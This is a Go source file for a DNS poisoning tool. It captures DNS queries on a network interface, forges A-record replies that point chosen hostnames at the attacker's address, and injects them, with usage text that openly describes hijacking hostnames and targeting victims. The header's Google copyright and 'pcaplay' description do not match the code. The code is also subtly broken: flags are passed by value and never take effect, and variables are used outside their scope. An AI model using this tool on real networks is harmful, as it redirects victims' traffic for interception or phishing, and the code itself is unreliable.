// Copyright 2012 Google, Inc. All rights reserved.
//
// Use of this source code is governed by a BSD-style license
// that can be found in the LICENSE file in the root of the source
// tree.

// The pcaplay binary load an offline capture (pcap file) and replay
// it on the select interface, with an emphasis on packet timing
package main

import (
	"flag"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"io/ioutil"
	"net"
	"os"
	"strings"
)

var (
	ipHostMapping map[string]string

	decoder       *gopacket.DecodingLayerParser
	decodedLayers []gopacket.LayerType
	serialOpts    gopacket.SerializeOptions
	buf           gopacket.SerializeBuffer

	ethLayer  layers.Ethernet
	ipv4Layer layers.IPv4
	udpLayer  layers.UDP
	dnsLayer  layers.DNS
)

// go run dnspoison.go [-i interface] [-f hostnames] [expression]
func main() {
	var (
		ifcName   string
		hostFile  string
		bpfFilter string
	)
	parseCommand(ifcName, hostFile, bpfFilter)

	// opens a device and returns a handle
	handle, err := pcap.OpenLive(ifcName, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	} else if err := handle.SetBPFFilter(bpfFilter); err != nil {
		panic(err)
	}
	defer handle.Close()

	defaultIP := queryIfcAddr(ifcName)    // get ip addr relates to the specified interface
	ipHostMapping = readMapping(hostFile) // read ip host mapping from file

	setupDecoder()

	for {
		packetData, _, _ := handle.ReadPacketData()
		err = decoder.DecodeLayers(packetData, &decodedLayers)
		if len(decodedLayers) != 4 || dnsLayer.QR { // if QR = 1, means its a DNS response packet
			continue
		}

		handlePackets(defaultIP)
	}

}

func parseCommand(ifcName string, hostFile string, bpfFilter string) {
	flag.StringVar(&ifcName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
	flag.StringVar(&hostFile, "f", "", "Read a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dnspoison would forge replies to all observed requests with the chosen interface's IP address as an answer")
	flag.Usage = func() {
		_, _ = fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
		fmt.Println("<expression> is a BPF filter that specifies a subset of the traffic to be monitored, which is useful for targeting a single victim or a group of victims")
	}
	flag.Parse()
	bpfFilterArr := flag.Args()
	if ifcName == "" { // interface is not specified, set as default device interface
		ifs, _ := pcap.FindAllDevs()
		ifcName = ifs[0].Name
	}
	if flag.NArg() != 0 {
		bpfFilter = strings.Join(bpfFilterArr, " ")
	} else {
		bpfFilter = "udp port 53"
	}
	// fmt.Println("Arguments:", ifcName, hostFile, strings.Join(bpfFilterArr, " "))
}

func queryIfcAddr(ifcName string) net.IP {
	interfaces, _ := net.Interfaces()
	for i := range interfaces {
		if interfaces[i].Name == ifcName {
			addrs, err := interfaces[i].Addrs()
			if err != nil {
				panic(err)
			}

			if len(addrs) == 0 {
				panic("No addr relates to specified interface")
			}

			for _, addr := range addrs {
				ip, _, _ := net.ParseCIDR(addr.String())
				if ip.To4() != nil {
					fmt.Println("ip to interface", ifcName, ip)
					return ip
				}
			}
		}
	}
	return nil
}

func readMapping(filename string) map[string]string {
	if filename == "" {
		return nil // return an empty map if filename not specified
	}

	ipHost := make(map[string]string)
	data, _ := ioutil.ReadFile(filename)
	lines := strings.Split(string(data), "\n")
	for _, element := range lines {
		line := strings.Fields(element)
		if len(line) == 0 {
			break
		}
		ipHost[line[1]] = line[0]
	}
	fmt.Println(ipHost)
	return ipHost
}

func setupDecoder() {
	decoder = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
	decodedLayers = make([]gopacket.LayerType, 0, 4)
	buf = gopacket.NewSerializeBuffer()
	serialOpts = gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
}

func handlePackets(defaultIP net.IP) {
	fmt.Println("========== Packet captured! ==========")
	fmt.Printf("DNS questions: total %v\n", dnsLayer.QDCount)
	var i uint16
	for i = 0; i < dnsLayer.QDCount; i++ {
		fmt.Printf("[%v]: %v", i, string(dnsLayer.Questions[i].Name))
	}

	dnsLayer.QR = true // QR: true indicates a response packet
	if dnsLayer.RD {   // RD(Recursion Desired): is set in a query and is copied into the response.
		dnsLayer.RA = true // RA(Recursion Available): indicates recursive query is available in the name server.
	}

	matched := false
	var q layers.DNSQuestion
	for i = 0; i < dnsLayer.QDCount; i++ { // iterate through questions
		q = dnsLayer.Questions[i]
		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
			continue
		}

		a := buildDNSAnswer(q, defaultIP)
		if a.IP != nil {
			matched = true
			fmt.Printf("forged: type %v, [%v] -> [%v]", a.Type, string(q.Name), a.IP)
			dnsLayer.Answers = append(dnsLayer.Answers, a)
			dnsLayer.ANCount = dnsLayer.ANCount + 1
			fmt.Printf("DNS answer total: %v\n", dnsLayer.ANCount)
		}
	}
	if matched == false {
		fmt.Println("no need to forge response")
		return
	}
	// swap src/dst in each layer
	swapSrcDst()
	// serialize packets
	_ = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
	_ = gopacket.SerializeLayers(buf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
	// write packet
	err = handle.WritePacketData(buf.Bytes())
	if err != nil {
		panic(err)
	}

	fmt.Println("Response sent")
}

func buildDNSAnswer(q layers.DNSQuestion, defaultIP net.IP) layers.DNSResourceRecord {
	var a layers.DNSResourceRecord
	a.Type = layers.DNSTypeA
	a.Class = layers.DNSClassIN
	a.TTL = 300
	a.Name = q.Name
	a.IP = getForgedIp(string(q.Name), defaultIP)
	return a
}

// return nil if file is specified while corresponding host is not provided
func getForgedIp(queryName string, defaultIP net.IP) net.IP {
	if ipHostMapping == nil { // mapping file is not specified, use ip addr of interface
		return defaultIP
	} else if ipStr, ok := ipHostMapping[queryName]; ok { // use ip addr in mapping file
		return net.ParseIP(ipStr)
	} else { // ip addr is not provided in mapping file, ignore
		return nil
	}
}

func swapSrcDst() {
	// swap src/dst mac
	tmpMac := ethLayer.SrcMAC
	ethLayer.SrcMAC = ethLayer.DstMAC
	ethLayer.DstMAC = tmpMac
	// swap src/dst ip
	tmpIP := ipv4Layer.SrcIP
	ipv4Layer.SrcIP = ipv4Layer.DstIP
	ipv4Layer.DstIP = tmpIP
	fmt.Printf("IP: src %v, dst %v\n", ipv4Layer.SrcIP, ipv4Layer.DstIP)
	// swap src/dst udp ports
	tmpPort := udpLayer.SrcPort
	udpLayer.SrcPort = udpLayer.DstPort
	udpLayer.DstPort = tmpPort
	fmt.Printf("UDP port: src %v, dst %v\n", udpLayer.SrcPort, udpLayer.DstPort)
}
